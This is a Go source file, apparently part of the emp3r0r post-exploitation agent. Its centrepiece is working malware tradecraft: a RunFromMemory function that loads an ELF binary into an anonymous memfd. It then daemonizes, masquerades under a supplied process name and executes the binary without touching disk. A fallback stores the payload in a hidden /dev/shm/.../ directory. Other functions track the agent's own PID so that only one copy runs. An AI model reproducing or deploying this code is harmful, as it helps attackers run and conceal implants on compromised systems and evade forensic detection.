package agent

import (
	"bufio"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"syscall"
	"unsafe"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
)

// CheckAgentProcess fill up info.emp3r0r_data.AgentProcess
func CheckAgentProcess() *emp3r0r_data.AgentProcess {
	p := &emp3r0r_data.AgentProcess{}
	p.PID = os.Getpid()
	p.PPID = os.Getppid()
	p.Cmdline = util.ProcCmdline(p.PID)
	p.Parent = util.ProcCmdline(p.PPID)

	return p
}

// IsAgentRunningPID is there any emp3r0r agent already running?
func IsAgentRunningPID() (bool, int) {
	defer func() {
		myPIDText := strconv.Itoa(os.Getpid())
		if err := ioutil.WriteFile(emp3r0r_data.PIDFile, []byte(myPIDText), 0600); err != nil {
			log.Printf("Write emp3r0r_data.PIDFile: %v", err)
		}
	}()

	pidBytes, err := ioutil.ReadFile(emp3r0r_data.PIDFile)
	if err != nil {
		return false, -1
	}
	pid, err := strconv.Atoi(string(pidBytes))
	if err != nil {
		return false, -1
	}

	_, err = os.FindProcess(pid)
	return err == nil, pid
}

// ProcUID get euid of a process
func ProcUID(pid int) string {
	f, err := os.Open(fmt.Sprintf("/proc/%d/status", pid))
	if err != nil {
		return ""
	}
	defer f.Close()
	scanner := bufio.NewScanner(f)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if strings.HasPrefix(line, "Uid:") {
			uid := strings.Fields(line)[1]
			return uid
		}
	}
	return ""
}

// run ELF from memory
func RunFromMemory(procName string, buffer []byte) (err error) {
	const (
		mfdCloexec     = 0x0001
		memfdCreateX64 = 319
		fork           = 57
	)
	fdName := "" // *string cannot be initialized

	fd, _, _ := syscall.Syscall(memfdCreateX64, uintptr(unsafe.Pointer(&fdName)), uintptr(mfdCloexec), 0)
	_, _ = syscall.Write(int(fd), buffer)

	fdPath := fmt.Sprintf("/proc/self/fd/%d", fd)

	switch child, _, _ := syscall.Syscall(fork, 0, 0, 0); child {
	case 0:
		break
	case 1:
		// Fork failed!
		return fmt.Errorf("fork failed")
	default:
		// Parent exiting...
		os.Exit(0)
	}

	_ = syscall.Umask(0)
	_, _ = syscall.Setsid()
	_ = syscall.Chdir("/")

	file, _ := os.OpenFile("/dev/null", os.O_RDWR, 0)
	err = syscall.Dup2(int(file.Fd()), int(os.Stdin.Fd()))
	if err != nil {
		return
	}
	file.Close()

	progWithArgs := append([]string{procName}, os.Args[1:]...)
	err = syscall.Exec(fdPath, progWithArgs, nil)
	if err == nil {
		log.Println("agent started from memory using memfd_create")
		return
	}

	// older kernel
	log.Printf("memfd_create failed: %v, trying shm_open", err)
	shmPath := "/dev/shm/.../"
	if _, err = os.Stat(shmPath); os.IsNotExist(err) {
		err = os.Mkdir(shmPath, 0700)
		if err != nil {
			return
		}
	}
	err = ioutil.WriteFile(shmPath+procName, buffer, 0755)
	if err != nil {
		return
	}
	err = os.Chdir(shmPath)
	if err != nil {
		return
	}
	cmd := exec.Command(procName, os.Args[1:]...)
	cmd.Env = os.Environ()
	return cmd.Start()
}
